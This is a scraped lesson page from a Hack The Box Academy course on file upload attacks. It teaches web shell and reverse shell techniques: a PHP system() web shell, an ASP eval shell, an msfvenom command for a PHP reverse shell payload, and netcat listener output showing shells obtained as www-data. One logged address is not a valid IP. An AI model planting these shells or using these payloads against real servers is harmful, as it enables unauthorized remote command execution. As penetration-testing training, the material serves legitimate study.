<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/136/section/1261
// Platform Version: V1
// Module ID: 136
// Module Name: File Upload Attacks
// Module Difficulty: Medium
// Section ID: 1261
// Section Title: Upload Exploitation
// Page Title: Hack The Box - Academy
// Page Number: 3
-->

# Upload Exploitation

**Module Name:** File Upload Attacks **Page Number:** 3

#### 

#### FILE UPLOAD ATTACKS

# Upload Exploitation

## Web Shells

![https://academy.hackthebox.com/storage/modules/136/file_uploads_php_bash.jpg](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_bash.jpg)

## Writing Custom Web Shell

``` php
<?php system($_REQUEST['cmd']); ?>
```

![https://academy.hackthebox.com/storage/modules/136/file_uploads_php_manual_shell.jpg](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_manual_shell.jpg)

``` asp
<% eval request('cmd') %>
```

## Reverse Shell

``` php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

``` shell-session
ndefstathiou@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Generating Custom Reverse Shell Scripts

``` shell-session
ndefstathiou@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...SNIP...
Payload size: 3033 bytes
```

``` shell-session
ndefstathiou@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 

# 

#### Questions

####